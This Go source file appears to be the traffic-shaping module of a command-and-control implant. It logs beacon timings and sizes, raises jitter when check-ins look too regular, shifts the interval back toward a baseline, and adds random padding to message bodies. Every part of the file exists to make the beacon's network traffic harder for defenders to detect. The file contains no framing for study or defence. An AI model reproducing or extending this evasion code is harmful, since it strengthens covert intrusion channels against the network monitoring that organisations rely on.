//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"math"
	"sync"
	"time"
)

type TrafficProfile struct {
	BaselineInterval   int    // seconds — observed normal interval
	BaselineJitter     int    // percentage
	BaselinePacketSize int    // bytes
	BaselineTLS        string // TLS fingerprint name
	BaselineUserAgent  string
	CurrentInterval    int
	CurrentJitter      int
	AdaptRate          float64 // how aggressively to adapt (0.0-1.0)
}

type AdaptationSuggestion struct {
	DesiredInterval int
	DesiredJitter   int
	PadSize         int
	Reason          string
}

type beaconTimingRecord struct {
	timestamp time.Time
	bodySize  int
}

var (
	trafficMu         sync.Mutex
	trafficHistory    []beaconTimingRecord
	trafficProfile    TrafficProfile
	maxTrafficSamples = 50
)

func initTrafficShaping() {
	trafficMu.Lock()
	defer trafficMu.Unlock()

	trafficProfile = TrafficProfile{
		BaselineInterval:   Interval,
		BaselineJitter:     Jitter,
		BaselinePacketSize: 0,
		BaselineTLS:        "",
		BaselineUserAgent:  UserAgent,
		CurrentInterval:    Interval,
		CurrentJitter:      Jitter,
		AdaptRate:          0.10,
	}
	trafficHistory = make([]beaconTimingRecord, 0, maxTrafficSamples)
}

func recordBeaconTiming(bodySize int) {
	trafficMu.Lock()
	defer trafficMu.Unlock()

	trafficHistory = append(trafficHistory, beaconTimingRecord{
		timestamp: time.Now(),
		bodySize:  bodySize,
	})

	if len(trafficHistory) > maxTrafficSamples {
		trafficHistory = trafficHistory[len(trafficHistory)-maxTrafficSamples:]
	}
}

func analyzeTrafficBaseline() *AdaptationSuggestion {
	trafficMu.Lock()
	defer trafficMu.Unlock()

	if len(trafficHistory) < 3 {
		return nil
	}

	intervals := make([]float64, 0, len(trafficHistory)-1)
	for i := 1; i < len(trafficHistory); i++ {
		secs := trafficHistory[i].timestamp.Sub(trafficHistory[i-1].timestamp).Seconds()
		if secs > 0 && secs < 3600 {
			intervals = append(intervals, secs)
		}
	}
	if len(intervals) < 2 {
		return nil
	}

	mean := 0.0
	for _, v := range intervals {
		mean += v
	}
	mean /= float64(len(intervals))

	var variance float64
	for _, v := range intervals {
		d := v - mean
		variance += d * d
	}
	variance /= float64(len(intervals))
	stddev := math.Sqrt(variance)

	sizes := make([]float64, 0, len(trafficHistory))
	for _, r := range trafficHistory {
		sizes = append(sizes, float64(r.bodySize))
	}
	meanSize := 0.0
	for _, s := range sizes {
		meanSize += s
	}
	meanSize /= float64(len(sizes))

	sugg := &AdaptationSuggestion{
		DesiredInterval: trafficProfile.CurrentInterval,
		DesiredJitter:   trafficProfile.CurrentJitter,
	}

	cv := stddev / mean
	if cv < 0.15 && len(intervals) >= 5 {
		sugg.DesiredJitter = trafficProfile.CurrentJitter + int(10.0*trafficProfile.AdaptRate*100)
		if sugg.DesiredJitter > 50 {
			sugg.DesiredJitter = 50
		}
		sugg.Reason = "beacon timing too regular, increasing jitter"
	}

	if trafficProfile.BaselineInterval > 0 {
		ratio := mean / float64(trafficProfile.BaselineInterval)
		if ratio < 0.5 || ratio > 2.0 {
			shift := int(float64(trafficProfile.BaselineInterval) * trafficProfile.AdaptRate)
			if shift < 1 {
				shift = 1
			}
			if ratio < 0.5 {
				sugg.DesiredInterval = trafficProfile.CurrentInterval + shift
			} else {
				sugg.DesiredInterval = trafficProfile.CurrentInterval - shift
				if sugg.DesiredInterval < 1 {
					sugg.DesiredInterval = 1
				}
			}
			if sugg.Reason == "" {
				sugg.Reason = "interval deviates from baseline, adjusting"
			}
		}
	}

	if trafficProfile.BaselinePacketSize > 0 && meanSize > 0 {
		sizeRatio := meanSize / float64(trafficProfile.BaselinePacketSize)
		if sizeRatio > 3.0 {
			sugg.PadSize = int(meanSize) / 2
			if sugg.PadSize > 8192 {
				sugg.PadSize = 8192
			}
			if sugg.Reason == "" {
				sugg.Reason = "packet size unusually large, adding padding"
			}
		}
	}

	return sugg
}

func adaptBeaconProfile(sugg *AdaptationSuggestion) {
	if sugg == nil {
		return
	}

	trafficMu.Lock()
	defer trafficMu.Unlock()

	change := int(float64(Interval) * trafficProfile.AdaptRate)
	if change < 1 {
		change = 1
	}
	if change > 5 {
		change = 5
	}

	if sugg.DesiredInterval != Interval && sugg.DesiredInterval > 0 {
		diff := sugg.DesiredInterval - Interval
		if diff > change {
			diff = change
		} else if diff < -change {
			diff = -change
		}
		Interval += diff
		if Interval < 1 {
			Interval = 1
		}
		trafficProfile.CurrentInterval = Interval
	}

	if sugg.DesiredJitter != Jitter && sugg.DesiredJitter >= 0 {
		diff := sugg.DesiredJitter - Jitter
		if diff > change {
			diff = change
		} else if diff < -change {
			diff = -change
		}
		Jitter += diff
		if Jitter < 0 {
			Jitter = 0
		}
		if Jitter > 70 {
			Jitter = 70
		}
		trafficProfile.CurrentJitter = Jitter
	}
}

func applyTrafficShaping(body []byte) []byte {
	if len(trafficHistory) == 0 {
		initTrafficShaping()
	}

	recordBeaconTiming(len(body))

	sugg := analyzeTrafficBaseline()
	if sugg != nil {
		adaptBeaconProfile(sugg)
	}

	if sugg != nil && sugg.PadSize > 0 {
		padLen := rng.Intn(sugg.PadSize)
		if padLen > 0 {
			pad := make([]byte, padLen)
			rng.Read(pad)
			body = append(body, pad...)
		}
	}

	return body
}
